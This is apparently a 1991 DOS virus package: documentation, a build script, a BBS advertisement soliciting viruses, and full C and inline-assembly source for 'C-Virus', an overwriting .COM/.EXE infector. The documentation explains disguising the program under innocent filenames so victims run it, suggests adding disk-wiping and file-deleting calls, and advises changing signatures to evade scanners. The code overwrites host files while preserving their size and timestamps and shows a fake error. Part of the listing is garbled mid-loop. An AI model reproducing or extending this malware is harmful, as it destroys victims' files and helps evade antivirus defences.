

                          Documentation for C-Virus


I. How to use

     To use C-Virus, merely rename it to some innocent (or not-so-innocent)
sounding file name, such as ULTIMA7.EXE or GIFVIEW.COM.  Then let someone run
it.  It's that simple.  Just make sure that its extension is .EXE or .COM.
     One option of C-Virus is that you can choose to replace any .EXE or .COM
file (or, if you really wanted to, any file) with C-Virus.  At the DOS prompt
type "C-Virus (filename)" where filename is the name of the victim.  C-Virus
will only spread to that file, not harming any other file in the directory. 
For example, you could type "CVIRUS WC2.EXE" and although WC2.EXE would appear
unchanged, it is now actually another copy of C-Virus.  Then feel free to
show "Wing Commander II" to all your friends (on their computers, of course).


II.  Modifying C-Virus

     C-Virus was written in Borland's Turbo C++ v1.00 with some inline 8086
assembly language.  C-Virus will also compile under Turbo C v2.00, and should
port to other IBM-PC C compilers with little modification.  If you'd like to
observe C-Virus in action, uncomment the line reading "// #define DEBUG 1." 
Note that this will cause the resultant .EXE file to grow by at least 1k.
     Another good area for modification is the function hostile_activity(). 
This function is automatically called if there are no files left to infect. 
The current version of C-Virus merely has this function beep three times and
print "All files infected.  Mission complete."  If you feel hostile or want
to seek revenge on someone with C-Virus, replacing the friendly message with
a few select calls to abswrite(), unlink(), and biosdisk() could liven things
up a bit.
     Other good expansions of C-Virus include adding support for multiple-
directory spreads; changing the code so that C-Virus only goes off on certain
days, weeks, etc.; adding memory-resident support; or, for the truly ambitious,
adding specific COMMAND.COM "support" <hehehe>.  Simple modifications to C-
Virus can easily create viruses just as good as the "professionals'."
     Note:  Try to avoid using printf() or related functions; they can increase
the size of C-Virus dramatically.  Instead use the function small_print(). 
In addition, note that TOO_SMALL is left defined at a little over 6k.  If,
when recompiling C-Virus, you see that the final product is larger or smaller,
change TOO_SMALL to a little over the size of the .EXE file.  This insures
maximum effect without alerting people via increase in file size.


III.  Recompiling C-Virus

     To re-compile C-Virus, use the included batch file MAKEVIR.BAT.  This
file assumes that you:  (1) Have LZEXE.EXE, and that it's in your path; (2) 
DEBUG is also in your path; and (3) That MAKEVIR.SCR is in the current
directory.  If any of these things are different on your computer, change the
batch file accordingly.
     A note about the "NMAN" signature:  When creating new versions of C-Virus,
I suggest changing the signature to something else.  IT MUST BE FOUR BYTES
LONG.  Change MAKEVIR.SCR so the second line reads "DB '(four bytes)'."  Also
change the definition of SIGNATURE in the C source code.  Nowhere Man would
appreciate that any modified versions do not read "NMAN" - use some other
bytes.  These bytes not only insure that there is a signature so that files
aren't re-infected, but they also stop people from UNLZEXEing you virus for
analysis.

IV.  Removing C-Virus

     DO NOT accidentally infect yourself.  Infected files are unrecoverable. 
If you infect your files, the only way to get rid of the virus is to erase
them.  Don't say you weren't warned.
     By the way, no virus-scanner that I know of can identify C-Virus.  Of
course, it's only a matter of time, so be sure to change the signature or
code in minor ways frequently.  Nothing can remove C-Virus either.  Oh well.


V.  A Listing for C-Virus (a l… The Computer Virus Handbook by Richard Levin)


C-Virus


Aliases                  None
Effective Length         N/A
Type code(s)             ONA - overwriting nonresident .COM and .EXE infector
Detection method         None
Removal instructions     Delete infected files


The C-Virus was written on June 25, 1991 by the mysterious hacker known as
"Nowhere Man."  It is a generic .COM and .EXE infector.  When it activates,
it displays the message "Out of memory."  It then exits back to DOS, making
the user believe that he had insufficient memory to run the program.  Because
C-Virus overwrites the file (although the file's size is unaffected), infected
files must be deleted and replaced with uninfected copies in order to remove
the virus.  When all files in a given directory are infected, a message is
displayed to that effect, and nothing further happens.
     Note:  There are many strains of the C-Virus, many of which aren't so
harmless.  Don't be lulled into a false sense of security.



                                  Have Fun!

                               - Nowhere Man@echo off
tcc -O -Z -ms cvirus.c > nul
if errorlevel 1 pause ** Error - Press Control-Break now **
erase cvirus.obj > nul
lzexe cvirus > nul
erase cvirus.old > nul
ren cvirus.exe cvir.tmp > nul
debug cvir.tmp < makevir.scr=""> nul
ren cvir.tmp cvirus.exe > nul
echo Your virus is done...



                  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
                  º          The Hell Pit BBS              º
                  º              1200/2400                 º
                  º Sysops:    Operating At    Permanent   º
                  º  HADES       4,500,000ø     suntans    º
                  º  K’TO                      available   º
                  º       °    (708)459-7267               º
                  º      °±°                   °          °º
                  º °   °±²±°      °          °²         °°º
                  º±   °±±²²±°      ±        °²±°       °±²º
                  º°± °±±²²±±±°   °±²°     °±±²²±°     °±²²º
                  º° °±±±²²²±±±° ±±²²²±°   ±±²²²²±°   °±²²²º
                  º°°±±±²²²²²±±±°±²²²²²±° °±²²²²²²±° °±²²²²º
                  º°±±²²²²²²²²²²²²²²²²²²²±²²²²²²²²²²²²²²²²²º
                  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                            We want your viruses!





/* C-Virus:  A generic .COM and .EXE infector

   Written by Nowhere Man

   Project started and completed on 6-24-91

   Written in Turbo C++ v1.00 (works fine with Turbo C v2.00, too)
*/


#pragma inline						// Compile to .ASM

#include <alloc.h>
#include <dir.h>
#include <dos.h>
#include <io.h>
#include <stdio.h>

void hostile_activity(void);
int infected(char *);
void spread(char *, char *);
void small_print(char *);
char *victim(void);

// #define DEBUG
#define ONE_KAY   1024					// 1k
#define TOO_SMALL ((6 * ONE_KAY) + 300)			// 6k+ size minimum
#define SIGNATURE "NMAN"				// Sign of infection

int main(void)
{
	/* The main program */

	spread(_argv[0], victim());			// Perform infection
	small_print("Out of memory\r\n");		// Print phony error
	return(1);					// Fake failure...
}

void hostile_activity(void)
{
	/* Put whatever you feel like doing here...I chose to
	   make this part harmless, but if you're feeling
	   nasty, go ahead and have some fun... */

	small_print("\a\a\aAll files infected.  Mission complete.\r\n");
	exit(2);
}

int infected(char *fname)
{
	/* This function determines if fname is infected */

	FILE *fp;					// File handle
	char sig[5];					// Virus signature

	fp = fopen(fname, "rb");
	fseek(fp, 28L, SEEK_SET);
	fread(sig, sizeof(sig) - 1, 1, fp);
#ifdef DEBUG
	printf("Signature for %s:  %s\n", fname, sig);
#endif
	fclose(fp);
	return(strncmp(sig, SIGNATURE, sizeof(sig) - 1) == 0);
}

void small_print(char *string)
{
	/* This function is a small, quick print routine */

	asm {
		push	si
		mov	si,string
		mov	ah,0xE
	}

print:	asm {
		lodsb
		or	al,al
		je	finish
		int	0x10
		jmp	short print
	}
finish: asm 	pop	si
}

void spread(char *old_name, char *new_name)
{
	/* This function infects new_name with old_name */


	/* Variable declarations */

	FILE *old, *new;				// File handles
	struct ftime file_time;                         // Old file date, time
	int attrib;					// Old attributes
	long old_size, virus_size;			// Sizes of files
	char *virus_code = NULL;			// Pointer to virus
	int old_handle, new_handle;			// Handles for files


	/* Perform the infection */

#ifdef DEBUG
	printf("Infecting %s with %s...\n", new_name, old_name);
#endif
	old = fopen(old_name, "rb");			// Open virus
	new = fopen(new_name, "rb");			// Open victim
	old_handle = fileno(old);			// Get file handles
	new_handle = fileno(new);
	old_size = filelength(new_handle);		// Get old file size
	virus_size = filelength(old_handle);		// Get virus size
	attrib = _chmod(new_name, 0);			// Get old attributes
	getftime(new_handle, &file_time);		// Get old file time
	fclose(new);					// Close the virusee
	_chmod(new_name, 1, 0);				// Clear any read-only
	unlink(new_name);				// Erase old file
	new = fopen(new_name, "wb");			// Open new virus
	new_handle = fileno(new);
	virus_code = malloc(virus_size);		// Allocate space
	fread(virus_code, virus_size, 1, old);		// Read virus from old
	fwrite(virus_code, virus_size, 1, new);         // Copy virus to new
	_chmod(new_name, 1, attrib);			// Replace attributes
	chsize(new_handle, old_size);			// Replace old size
	setftime(new_handle, &file_time);		// Replace old time


	/* Clean up */

	fcloseall();					// Close files
	free(virus_code);				// Free memory
}

char *victim(void)
{
	/* This function returns the virus's next victim */


	/* Variable declarations */

	char *types[] = {"*.EXE", "*.COM"};		// Potential victims
	static struct ffblk ffblk;			// DOS file block
	int done;					// Indicates finish
	int index;					// Used for loop


	/* Find our victim */

	if ((_argc > 1) && (fopen(_argv[1], "rb") != NULL))
		return(_argv[1]);
	for (index = 0; index < sizeof(types);="" index++)="" {="" done="findfirst(types[index]," &ffblk,="" fa_rdonly="" |="" fa_hidden="" |="" fa_system="" |="" fa_arch);="" while="" (!done)="" {="" #ifdef="" debug="" printf("scanning="" %s...\n",="" ffblk.ff_name);="" #endif="" if="" you="" want="" to="" check="" for="" specific="" days="" of="" the="" week,="" months,="" etc.,="" here="" is="" the="" place="" to="" insert="" the="" code="" (don't="" forget="" to="" "#include=""><time.h>"!) */

			if ((!infected(ffblk.ff_name)) && (ffblk.ff_fsize > TOO_SMALL))
				return(ffblk.ff_name);
			done = findnext(&ffblk);
		}
	}


	/* If there are no files left to infect, have a little fun... */

	hostile_activity();
	return(0);					// Prevents warning
}
</time.h></stdio.h></io.h></dos.h></dir.h></alloc.h></hehehe>